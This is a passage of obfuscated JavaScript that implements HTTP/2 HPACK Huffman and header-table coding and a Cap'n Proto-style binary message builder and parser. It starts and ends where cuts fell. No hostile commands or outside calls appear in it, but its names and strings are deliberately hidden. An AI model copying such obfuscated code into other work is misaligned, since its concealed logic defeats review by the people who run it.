        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0b6 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0b7() {
    const hs = a0d9, a = {
            'ycqtm': function (c, d) {
                return c < d;
            },
            'jAsrQ': function (c, d) {
                return c - d;
            },
            'YYkXk': function (c, d) {
                return c >= d;
            },
            'QVbwf': function (c, d) {
                return c & d;
            },
            'PIOGt': function (c, d) {
                return c === d;
            },
            'hiqSG': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[hs(0x47a)](c, a0b5[hs(0xc54)]); c++) {
        const d = a0b5[c], f = a0b6[c];
        let g = b;
        for (let h = a['jAsrQ'](f, 0x1); a[hs(0x99a)](h, 0x0); h--) {
            const i = a[hs(0xc34)](d >> h, 0x1);
            a[hs(0x722)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a[hs(0xbdb)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0b8 = a0b7();
function a0b9(a) {
    const ht = a0d9, b = {
            'FZrKF': function (h, i) {
                return h >= i;
            },
            'DXBOi': function (h, i) {
                return h & i;
            },
            'iwTBG': function (h, i) {
                return h | i;
            },
            'DaZYI': function (h, i) {
                return h === i;
            },
            'PIOjv': ht(0x273),
            'XLEim': ht(0xc1a),
            'lbDtB': function (h, i) {
                return h === i;
            },
            'UTJkF': ht(0x7b7),
            'oyAsV': function (h, i) {
                return h > i;
            },
            'TDdfB': function (h, i) {
                return h !== i;
            },
            'DKAFd': function (h, i) {
                return h - i;
            },
            'rznwv': function (h, i) {
                return h << i;
            }
        }, c = [];
    let d = a0b8, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[ht(0x1cc)](i, 0x0); i--) {
            const j = b[ht(0xff9)](h >> i, 0x1);
            f = b[ht(0xc02)](f << 0x1, j), g += 0x1, d = d[j];
            if (b[ht(0xc3f)](d, null))
                throw new Error(b[ht(0x815)]);
            if (d[0x2] >= 0x0) {
                const k = b[ht(0x597)]['split']('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        g = 0x0;
                        continue;
                    case '1':
                        if (b[ht(0xde5)](d[0x2], 0x100))
                            throw new Error(b[ht(0xf2a)]);
                        continue;
                    case '2':
                        c[ht(0xb66)](d[0x2]);
                        continue;
                    case '3':
                        d = a0b8;
                        continue;
                    case '4':
                        f = 0x0;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b[ht(0x5a3)](g, 0x7) || b[ht(0x54a)](f, b[ht(0xb0b)](b[ht(0xa95)](0x1, g), 0x1)))
        throw new Error(ht(0x549));
    return Buffer['from'](c);
}
function a0ba(a, b, c) {
    const hu = a0d9, d = {
            'OyJUz': function (j, k) {
                return j >= k;
            },
            'uuFeW': hu(0x524),
            'HOXtR': function (j, k) {
                return j - k;
            },
            'EhZis': function (j, k) {
                return j & k;
            },
            'LSwlI': function (j, k) {
                return j < k;
            },
            'hsqZP': function (j, k) {
                return j >= k;
            },
            'HCmmX': function (j, k) {
                return j * k;
            },
            'WcoCU': function (j, k) {
                return j & k;
            },
            'dScpe': hu(0x4a0)
        };
    if (d[hu(0x951)](b, a[hu(0xc54)]))
        throw new Error(d[hu(0xa8a)]);
    const f = a[b];
    b += 0x1;
    const g = d[hu(0x867)](0x1 << c, 0x1);
    let h = d[hu(0x7fb)](f, g);
    if (d[hu(0x4d9)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (d[hu(0xb6b)](b, a[hu(0xc54)]))
            throw new Error(hu(0x524));
        const j = a[b];
        b += 0x1, h += d['HCmmX'](j & 0x7f, Math[hu(0xdb8)](0x2, i));
        if (d[hu(0x476)](j, 0x80) === 0x0)
            return [
                h,
                b
            ];
        i += 0x7;
        if (i > 0x1c)
            throw new Error(d[hu(0xe24)]);
    }
}
function a0bb(a, b) {
    const hv = a0d9, c = {
            'yfIjc': hv(0xe2e),
            'TyZXg': function (j, k) {
                return j & k;
            },
            'RYhJh': function (j, k) {
                return j + k;
            },
            'xfurv': hv(0xd43),
            'lvoVK': function (j, k) {
                return j(k);
            }
        };
    if (b >= a[hv(0xc54)])
        throw new Error(c['yfIjc']);
    const d = Boolean(c[hv(0x861)](a[b], 0x80)), [f, g] = a0ba(a, b, 0x7), h = c[hv(0x712)](g, f);
    if (h > a[hv(0xc54)])
        throw new Error(c[hv(0xaa9)]);
    const i = a[hv(0xad0)](g, h);
    return [
        d ? c[hv(0x68f)](a0b9, i) : i,
        h
    ];
}
class a0bc {
    constructor() {
        const hw = a0d9;
        this['dynamic'] = [], this[hw(0xf4f)] = 0x0, this[hw(0xc64)] = 0x1000;
    }
    [a0d9(0x288)](a) {
        const hx = a0d9, b = {
                'zTaNB': function (d, f) {
                    return d <= f;
                },
                'aaZva': hx(0x1073),
                'eNRfH': function (d, f) {
                    return d <= f;
                },
                'UTpVD': function (d, f) {
                    return d - f;
                },
                'BAEao': function (d, f) {
                    return d - f;
                },
                'fHSCC': function (d, f) {
                    return d < f;
                },
                'voJrG': function (d, f) {
                    return d >= f;
                },
                'FVbBS': hx(0x33f)
            };
        if (b['zTaNB'](a, 0x0))
            throw new Error(b[hx(0x2d5)]);
        if (b[hx(0x2db)](a, a0b4[hx(0xc54)]))
            return a0b4[a - 0x1];
        const c = b[hx(0x6b2)](b[hx(0xe7e)](a, a0b4['length']), 0x1);
        if (b[hx(0xf3d)](c, 0x0) || b['voJrG'](c, this[hx(0x6e9)]['length']))
            throw new Error(b[hx(0xe16)]);
        return this[hx(0x6e9)][c];
    }
    [a0d9(0xbcd)](a, b) {
        const hy = a0d9, c = {
                'JMVrJ': function (f, g) {
                    return f + g;
                },
                'QHDYp': function (f, g) {
                    return f + g;
                },
                'oVbFB': hy(0xec2),
                'VzQCI': function (f, g) {
                    return f > g;
                },
                'XLQMX': function (f, g) {
                    return f > g;
                },
                'VbXna': function (f, g) {
                    return f + g;
                },
                'fUMfG': function (f, g) {
                    return f + g;
                }
            }, d = c[hy(0x47e)](c[hy(0x6d0)](0x20, Buffer['byteLength'](a, c[hy(0xdab)])), Buffer[hy(0x735)](b, c[hy(0xdab)]));
        if (c[hy(0x8f3)](d, this[hy(0xc64)])) {
            this['dynamic'] = [], this['dynamicSize'] = 0x0;
            return;
        }
        while (c[hy(0xc57)](this[hy(0x6e9)][hy(0xc54)], 0x0) && c[hy(0xc57)](c[hy(0xbbe)](this[hy(0xf4f)], d), this[hy(0xc64)])) {
            const [f, g] = this[hy(0x6e9)][hy(0xbfa)]();
            this[hy(0xf4f)] -= c['fUMfG'](c[hy(0x6d0)](0x20, Buffer[hy(0x735)](f, c['oVbFB'])), Buffer[hy(0x735)](g, c[hy(0xdab)]));
        }
        this['dynamic'][hy(0x3a1)]([
            a,
            b
        ]), this[hy(0xf4f)] += d;
    }
    [a0d9(0x106e)](a) {
        const hz = a0d9, b = {
                'JNipn': function (f, g) {
                    return f & g;
                },
                'ezwlS': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'UdzyM': function (f, g, h) {
                    return f(g, h);
                },
                'MRrOe': hz(0xec2),
                'fpnXj': function (f, g) {
                    return f > g;
                },
                'MFQeN': hz(0x30e),
                'XJiXe': function (f, g) {
                    return f + g;
                },
                'WhNpl': function (f, g) {
                    return f + g;
                },
                'Beszv': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'jSWWl': function (f, g, h) {
                    return f(g, h);
                },
                'BjCRZ': function (f, g, h) {
                    return f(g, h);
                }
            }, c = [];
        let d = 0x0;
        while (d < a[hz(0xc54)]) {
            const f = a[d];
            if (b['JNipn'](f, 0x80)) {
                let j;
                [j, d] = b[hz(0x81e)](a0ba, a, d, 0x7), c['push'](this[hz(0x288)](j));
                continue;
            }
            if (b[hz(0x874)](f, 0x40)) {
                let k, l;
                [k, d] = b['ezwlS'](a0ba, a, d, 0x6);
                if (k)
                    l = this[hz(0x288)](k)[0x0];
                else {
                    let o;
                    [o, d] = b[hz(0x4e7)](a0bb, a, d), l = o[hz(0x43a)](hz(0xec2))[hz(0x544)]();
                }
                let m;
                [m, d] = b[hz(0x4e7)](a0bb, a, d);
                const n = m[hz(0x43a)](b[hz(0xc90)]);
                this[hz(0xbcd)](l, n), c[hz(0xb66)]([
                    l,
                    n
                ]);
                continue;
            }
            if (f & 0x20) {
                let p;
                [p, d] = a0ba(a, d, 0x5);
                if (b['fpnXj'](p, 0x1000))
                    throw new Error(b[hz(0x78e)]);
                this[hz(0xc64)] = p;
                while (b[hz(0x522)](this['dynamic'][hz(0xc54)], 0x0) && this['dynamicSize'] > p) {
                    const [q, r] = this[hz(0x6e9)][hz(0xbfa)]();
                    this['dynamicSize'] -= b[hz(0xcbf)](b[hz(0x79b)](0x20, Buffer['byteLength'](q, b['MRrOe'])), Buffer[hz(0x735)](r, b[hz(0xc90)]));
                }
                continue;
            }
            let g, h;
            [g, d] = b[hz(0xd89)](a0ba, a, d, 0x4);
            if (g)
                h = this[hz(0x288)](g)[0x0];
            else {
                let s;
                [s, d] = b[hz(0x85b)](a0bb, a, d), h = s[hz(0x43a)](b['MRrOe'])[hz(0x544)]();
            }
            let i;
            [i, d] = b[hz(0xc77)](a0bb, a, d), c[hz(0xb66)]([
                h,
                i[hz(0x43a)](hz(0xec2))
            ]);
        }
        return c;
    }
}
function a0bd(a, b, c) {
    const hA = a0d9, d = {
            'TsqeY': function (h, i) {
                return h - i;
            },
            'imVgN': function (h, i) {
                return h << i;
            },
            'VrDFE': function (h, i) {
                return h < i;
            },
            'fQOSt': function (h, i) {
                return h | i;
            },
            'JJPId': function (h, i) {
                return h | i;
            },
            'NRUia': function (h, i) {
                return h >= i;
            },
            'ksNBL': function (h, i) {
                return h & i;
            },
            'ogCFz': function (h, i) {
                return h / i;
            }
        }, f = d[hA(0xad2)](d[hA(0xcb5)](0x1, b), 0x1);
    if (d[hA(0x7ae)](a, f))
        return Buffer[hA(0xca5)]([d['fQOSt'](c, a)]);
    const g = [d[hA(0xa74)](c, f)];
    a -= f;
    while (d[hA(0x68c)](a, 0x80)) {
        g[hA(0xb66)](d['ksNBL'](a, 0x7f) | 0x80), a = Math[hA(0x568)](d[hA(0x1f4)](a, 0x80));
    }
    return g[hA(0xb66)](a), Buffer[hA(0xca5)](g);
}
function a0be(a) {
    const hB = a0d9, b = {
            'LfFpL': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[hB(0xca5)](a, 'utf8');
    return Buffer[hB(0x83f)]([
        b[hB(0x100b)](a0bd, c['length'], 0x7, 0x0),
        c
    ]);
}
function a0b(a, b) {
    a = a - 0x139;
    const c = a0a();
    let d = c[a];
    if (a0b['KvoJtC'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['vMuepD'] = e, a0b['ivvEJH'] = {}, a0b['KvoJtC'] = !![];
    }
    const f = c[0x0];
    a0b['BPYtrz'] !== f && (a0b['ivvEJH'] = {}, a0b['BPYtrz'] = f);
    const g = a0b['ivvEJH'][a];
    return g === undefined ? (d = a0b['vMuepD'](d), a0b['ivvEJH'][a] = d) : d = g, d;
}
function a0bf(a) {
    const hC = a0d9, b = {
            'HiCew': function (d, f) {
                return d === f;
            },
            'JTZPm': hC(0x6ab),
            'iTqEy': function (d, f) {
                return d === f;
            },
            'shjKj': hC(0x8c8),
            'gLiAN': function (d, f) {
                return d === f;
            },
            'CWAUg': '204',
            'TpqhI': hC(0x268),
            'vBcNb': function (d, f) {
                return d === f;
            },
            'VPoNt': function (d, f) {
                return d === f;
            },
            'aSkyE': hC(0xb8c),
            'xvONQ': hC(0x765),
            'BHGHE': '404',
            'ayWwY': function (d, f) {
                return d === f;
            },
            'QgFYK': function (d, f) {
                return d === f;
            },
            'tvFiO': function (d, f, g, h) {
                return d(f, g, h);
            },
            'fvzWu': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (d === ':status' && b[hC(0xf1c)](f, b[hC(0x2f6)]))
            c['push'](0x88);
        else {
            if (b['iTqEy'](d, b[hC(0xbc5)]) && b['gLiAN'](f, b['CWAUg']))
                c[hC(0xb66)](0x89);
            else {
                if (b[hC(0x96d)](d, ':status') && f === b['TpqhI'])
                    c[hC(0xb66)](0x8a);
                else {
                    if (b[hC(0x2e1)](d, hC(0x8c8)) && b['VPoNt'](f, b[hC(0x98b)]))
                        c[hC(0xb66)](0x8b);
                    else {
                        if (b[hC(0x1033)](d, b['shjKj']) && b[hC(0x96d)](f, b[hC(0xdf4)]))
                            c[hC(0xb66)](0x8c);
                        else {
                            if (b['vBcNb'](d, b[hC(0xbc5)]) && f === b[hC(0xf2b)])
                                c['push'](0x8d);
                            else
                                b['ayWwY'](d, hC(0x8c8)) && b['QgFYK'](f, hC(0x9e0)) ? c['push'](0x8e) : (c[hC(0xb66)](...b[hC(0xf86)](a0bd, 0x0, 0x4, 0x0)), c[hC(0xb66)](...b['fvzWu'](a0be, d)), c[hC(0xb66)](...a0be(f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer['from'](c);
}
class a0bg {
    constructor() {
        const hD = a0d9;
        this[hD(0xd1d)] = [];
    }
    [a0d9(0x901)](a) {
        const hE = a0d9, b = {
                'gcyWN': function (d, f) {
                    return d < f;
                }
            }, c = this['words'][hE(0xc54)];
        for (let d = 0x0; b[hE(0xf58)](d, a); d++) {
            this['words'][hE(0xb66)](0x0n);
        }
        return c;
    }
    [a0d9(0x54f)](a, b, c, d) {
        const hF = a0d9, f = {
                'sgpPH': function (j, k) {
                    return j - k;
                },
                'DVSqm': function (j, k) {
                    return j & k;
                },
                'KJIMR': function (j, k) {
                    return j << k;
                },
                'Wzhtu': function (j, k) {
                    return j(k);
                },
                'VYgRg': function (j, k) {
                    return j | k;
                },
                'Zmbnr': function (j, k) {
                    return j | k;
                }
            }, g = f[hF(0x189)](f[hF(0x189)](b, a), 0x1), h = f[hF(0x7f1)](f[hF(0xe50)](f[hF(0x455)](BigInt, g), 0x2n), 0xfffffffcn), i = f[hF(0x454)](f[hF(0x455)](BigInt, f[hF(0x7f1)](c, 0xffff)), f[hF(0xe50)](f['Wzhtu'](BigInt, f[hF(0x7f1)](d, 0xffff)), 0x10n));
        this[hF(0xd1d)][a] = f[hF(0xaa6)](h, i << 0x20n);
    }
    [a0d9(0x388)](a, b, c) {
        const hG = a0d9, d = {
                'ZwZxR': function (g, h) {
                    return g * h;
                },
                'sQakt': function (g, h) {
                    return g | h;
                },
                'uJXeb': function (g, h) {
                    return g & h;
                },
                'nOaJd': function (g, h) {
                    return g(h);
                },
                'rpZvO': function (g, h) {
                    return g & h;
                }
            }, f = 0xffn << BigInt(d[hG(0x6a5)](b, 0x8));
        this[hG(0xd1d)][a] = d[hG(0xe12)](d[hG(0xfd5)](this[hG(0xd1d)][a], ~f), d[hG(0x73e)](BigInt, d[hG(0xd04)](c, 0xff)) << BigInt(b * 0x8));
    }
    ['setU16'](a, b, c) {
        const hH = a0d9, d = {
                'LGLwr': function (g, h) {
                    return g << h;
                },
                'ULrYw': function (g, h) {
                    return g * h;
                },
                'fidkJ': function (g, h) {
                    return g | h;
                },
                'SLFGh': function (g, h) {
                    return g & h;
                },
                'thljT': function (g, h) {
                    return g(h);
                },
                'hknly': function (g, h) {
                    return g(h);
                }
            }, f = d[hH(0x8ed)](0xffffn, BigInt(d['ULrYw'](b, 0x8)));
        this[hH(0xd1d)][a] = d[hH(0xf59)](d[hH(0xe60)](this[hH(0xd1d)][a], ~f), d[hH(0x8ed)](d[hH(0x409)](BigInt, c & 0xffff), d[hH(0xa4e)](BigInt, b * 0x8)));
    }
    [a0d9(0x45d)](a, b, c) {
        const hI = a0d9, d = {
                'CRwYV': function (g, h) {
                    return g << h;
                },
                'jsDvc': function (g, h) {
                    return g(h);
                },
                'RBAOz': function (g, h) {
                    return g * h;
                },
                'AuvXP': function (g, h) {
                    return g | h;
                },
                'GVCAk': function (g, h) {
                    return g & h;
                },
                'eHEHt': function (g, h) {
                    return g << h;
                },
                'JVCQy': function (g, h) {
                    return g(h);
                },
                'HmsoA': function (g, h) {
                    return g & h;
                },
                'hqwFr': function (g, h) {
                    return g(h);
                }
            }, f = d[hI(0x313)](0xffffffffn, d[hI(0x638)](BigInt, d[hI(0xd4c)](b, 0x8)));
        this[hI(0xd1d)][a] = d[hI(0x6a8)](d[hI(0x9ee)](this[hI(0xd1d)][a], ~f), d['eHEHt'](d[hI(0x98f)](BigInt, d['HmsoA'](c, 0xffffffff)), d[hI(0xccb)](BigInt, d[hI(0xd4c)](b, 0x8))));
    }
    [a0d9(0x8a8)](a, b) {
        const hJ = a0d9, c = {
                'Lmkrh': function (d, f) {
                    return d & f;
                }
            };
        this[hJ(0xd1d)][a] = c[hJ(0x3bf)](BigInt(b), 0xffffffffffffffffn);
    }
    [a0d9(0xfdb)](a, b, c = ![]) {
        const hK = a0d9, d = {
                'wQWcW': function (m, n) {
                    return m === n;
                },
                'ejmxp': hK(0xba0),
                'WSyjT': function (m, n) {
                    return m + n;
                },
                'rnVGj': function (m, n) {
                    return m / n;
                },
                'glUWA': function (m, n) {
                    return m < n;
                },
                'fEzHs': function (m, n) {
                    return m / n;
                },
                'gDlBb': function (m, n) {
                    return m % n;
                },
                'ivXAw': function (m, n) {
                    return m - n;
                },
                'EqQhs': function (m, n) {
                    return m | n;
                },
                'vfQvu': function (m, n) {
                    return m << n;
                },
                'LBGlA': function (m, n) {
                    return m & n;
                }
            }, f = d['wQWcW'](typeof b, d[hK(0xad7)]) ? Buffer[hK(0xca5)](b, hK(0xec2)) : b, g = d[hK(0xf15)](f[hK(0xc54)], c ? 0x1 : 0x0), h = this['alloc'](Math[hK(0x44d)](d[hK(0x6e7)](g, 0x8)));
        for (let m = 0x0; d['glUWA'](m, f['length']); m++) {
            this['setU8'](d[hK(0xf15)](h, Math['floor'](d[hK(0x672)](m, 0x8))), d[hK(0xfaa)](m, 0x8), f[m]);
        }
        const j = d[hK(0x6ae)](d[hK(0x6ae)](h, a), 0x1), k = d['EqQhs'](d[hK(0x985)](BigInt(j), 0x2n), 0x1n) & 0xffffffffn, l = d['EqQhs'](0x2n, d[hK(0x985)](BigInt(d[hK(0xff5)](g, 0x1fffffff)), 0x3n));
        this[hK(0xd1d)][a] = k | d['vfQvu'](l, 0x20n);
    }
    ['writeTextList'](a, b) {
        const hL = a0d9, c = {
                'umOPK': function (g, h) {
                    return g - h;
                },
                'qQTVI': function (g, h) {
                    return g & h;
                },
                'bFjnT': function (g, h) {
                    return g << h;
                },
                'TxurN': function (g, h) {
                    return g(h);
                },
                'AXSLY': function (g, h) {
                    return g << h;
                },
                'oPZuT': function (g, h) {
                    return g | h;
                },
                'aODYx': function (g, h) {
                    return g << h;
                },
                'rIizS': function (g, h) {
                    return g < h;
                },
                'aFYMh': function (g, h) {
                    return g + h;
                }
            };
        if (!b[hL(0xc54)]) {
            this['words'][a] = 0x0n;
            return;
        }
        const d = this['alloc'](b[hL(0xc54)]), f = c['umOPK'](c['umOPK'](d, a), 0x1);
        this['words'][a] = c[hL(0x274)](c[hL(0xb03)](c[hL(0x1ef)](BigInt, f), 0x2n) | 0x1n, 0xffffffffn) | c[hL(0xa30)](c[hL(0x6f7)](0x6n, c[hL(0x6e5)](c[hL(0x1ef)](BigInt, b['length']), 0x3n)), 0x20n);
        for (let g = 0x0; c[hL(0x481)](g, b[hL(0xc54)]); g++) {
            this[hL(0xfdb)](c['aFYMh'](d, g), b[g], !![]);
        }
    }
    [a0d9(0xe3d)](a, b, c, d, f) {
        const hM = a0d9, g = {
                'RpWQA': function (m, n) {
                    return m + n;
                },
                'Khepi': function (m, n) {
                    return m * n;
                },
                'MQfHZ': function (m, n) {
                    return m - n;
                },
                'KYeQZ': function (m, n) {
                    return m - n;
                },
                'YQPqT': function (m, n) {
                    return m & n;
                },
                'jDIXF': function (m, n) {
                    return m | n;
                },
                'NCPVI': function (m, n) {
                    return m << n;
                },
                'bRffO': function (m, n) {
                    return m(n);
                },
                'mhEnq': function (m, n) {
                    return m(n);
                },
                'YyYnx': function (m, n) {
                    return m(n);
                },
                'MQSIj': function (m, n) {
                    return m(n);
                },
                'kpPpV': function (m, n) {
                    return m << n;
                },
                'CdTby': function (m, n) {
                    return m << n;
                },
                'JhUlT': function (m, n) {
                    return m(n);
                },
                'LWJmb': function (m, n) {
                    return m < n;
                },
                'OFfvW': function (m, n, o) {
                    return m(n, o);
                },
                'sPPnu': function (m, n) {
                    return m + n;
                },
                'dSvgh': function (m, n) {
                    return m * n;
                }
            }, h = this['alloc'](0x1), j = g[hM(0xde0)](c, d), k = this[hM(0x901)](g['Khepi'](b, j)), l = g[hM(0x1d7)](g[hM(0x9e6)](h, a), 0x1);
        this['words'][a] = g['YQPqT'](g[hM(0x2e9)](g[hM(0x372)](g[hM(0x3ee)](BigInt, l), 0x2n), 0x1n), 0xffffffffn) | g[hM(0x372)](g[hM(0x372)](g[hM(0x660)](g[hM(0x9e8)](BigInt, b), g['YyYnx'](BigInt, j)), 0x3n) | 0x7n, 0x20n), this[hM(0xd1d)][h] = g[hM(0x2e9)](g[hM(0x2e9)](g[hM(0x949)](BigInt, b) << 0x2n, g[hM(0xd91)](g['YyYnx'](BigInt, c), 0x20n)), g[hM(0xdf9)](g[hM(0x9bf)](BigInt, d), 0x30n));
        for (let m = 0x0; g['LWJmb'](m, b); m++) {
            g[hM(0xb37)](f, m, g['sPPnu'](k, g['dSvgh'](m, j)));
        }
    }
    [a0d9(0xf7a)]() {
        const hN = a0d9, a = {
                'WzwRP': function (d, f) {
                    return d < f;
                }
            }, b = Buffer['alloc'](0x8);
        b['writeUInt32LE'](0x0, 0x0), b[hN(0x2bd)](this[hN(0xd1d)][hN(0xc54)], 0x4);
        const c = Buffer[hN(0x901)](this[hN(0xd1d)][hN(0xc54)] * 0x8);
        for (let d = 0x0; a[hN(0xcc8)](d, this[hN(0xd1d)][hN(0xc54)]); d++) {
            c[hN(0x1e0)](this[hN(0xd1d)][d] & 0xffffffffffffffffn, d * 0x8);
        }
        return Buffer[hN(0x83f)]([
            b,
            c
        ]);
    }
}
function a0bh(a) {
    const hO = a0d9, b = new a0bg(), c = b['alloc'](0x1), d = b[hO(0x901)](0x1), f = b[hO(0x901)](0x1);
    b['structPtr'](c, d, 0x1, 0x1), b[hO(0x827)](d, 0x0, 0x8);
    const g = b[hO(0x901)](0x1);
    return b[hO(0x901)](0x1), b[hO(0x54f)](f, g, 0x1, 0x1), b[hO(0x45d)](g, 0x0, a), b['finish']();
}
function a0bi(a, b, c, d, f, g) {
    const hP = a0d9, h = {
            'giKIn': function (H, I) {
                return H | I;
            },
            'viLUa': hP(0xdaf),
            'PghDV': hP(0x9b5),
            'Vmhbb': hP(0x696),
            'iCJqa': hP(0xe77)
        }, i = new a0bg(), j = i[hP(0x901)](0x1), k = i[hP(0x901)](0x1), l = i[hP(0x901)](0x1);
    i[hP(0x54f)](j, k, 0x1, 0x1), i[hP(0x827)](k, 0x0, 0x2);
    const m = i[hP(0x901)](0x1), n = i[hP(0x901)](0x1);
    i[hP(0x901)](0x1);
    const o = i[hP(0x901)](0x1), p = i[hP(0x901)](0x1);
    i[hP(0x901)](0x1), i[hP(0x54f)](l, m, 0x3, 0x3), i[hP(0x45d)](m, 0x0, a), i[hP(0x8a8)](n, 0xf71695ec7fe85497n);
    const q = i[hP(0x901)](0x1), r = i[hP(0x901)](0x1);
    i[hP(0x54f)](o, q, 0x1, 0x1), i[hP(0x827)](q, 0x4, 0x1);
    const s = i[hP(0x901)](0x1);
    i[hP(0x901)](0x1), i[hP(0x54f)](r, s, 0x1, 0x1), i[hP(0x45d)](s, 0x0, b);
    const t = i[hP(0x901)](0x1);
    i[hP(0x901)](0x1), i[hP(0x54f)](p, t, 0x0, 0x2);
    const u = i['alloc'](0x1), v = i[hP(0x901)](0x1), w = i[hP(0x901)](0x1), x = i[hP(0x901)](0x1);
    i['structPtr'](t, u, 0x1, 0x3), i[hP(0x388)](u, 0x0, g);
    const y = i[hP(0x901)](0x1), z = i[hP(0x901)](0x1);
    i[hP(0x54f)](v, y, 0x0, 0x2), i[hP(0xfdb)](y, c, !![]), i[hP(0xfdb)](z, d), i['writeBytes'](w, f);
    const A = i[hP(0x901)](0x1), B = i[hP(0x901)](0x1);
    i[hP(0x901)](0x1), i[hP(0x54f)](x, A, 0x1, 0x2);
    const C = i[hP(0x901)](0x1), D = i[hP(0x901)](0x1), E = i['alloc'](0x1), F = i[hP(0x901)](0x1);
    i[hP(0x54f)](B, C, 0x0, 0x4);
    const G = a0k[hP(0x7bb)](0x10);
    return G[0x6] = h['giKIn'](G[0x6] & 0xf, 0x40), G[0x8] = G[0x8] & 0x3f | 0x80, i[hP(0xfdb)](C, G), i[hP(0x763)](D, [
        h[hP(0xb13)],
        h[hP(0x561)]
    ]), i[hP(0xfdb)](E, h[hP(0x4f8)], !![]), i[hP(0xfdb)](F, h['iCJqa'], !![]), i[hP(0xf7a)]();
}
function a0bj(a) {
    const hQ = a0d9, b = {
            'ncIsv': function (f, g) {
                return f >= g;
            },
            'GVFRV': function (f, g) {
                return f - g;
            },
            'XkOcM': function (f, g) {
                return f + g;
            },
            'OPZOw': function (f, g) {
                return f < g;
            },
            'xbTou': function (f, g) {
                return f < g;
            },
            'tCgDz': function (f, g) {
                return f + g;
            },
            'MODeT': function (f, g) {
                return f * g;
            },
            'EAPvh': function (f, g) {
                return f * g;
            },
            'hlxxc': function (f, g) {
                return f !== g;
            },
            'kshiU': hQ(0xd9b)
        }, c = [];
    let d = 0x0;
    while (b[hQ(0x417)](b[hQ(0xec0)](a[hQ(0xc54)], d), 0x8)) {
        const f = a[hQ(0xa91)](d), g = a[hQ(0xa91)](d + 0x4), h = b[hQ(0xa3d)](f, 0x1);
        let j = b[hQ(0xa3d)](h, 0x1), k = j * 0x4;
        k % 0x8 && (k += 0x4);
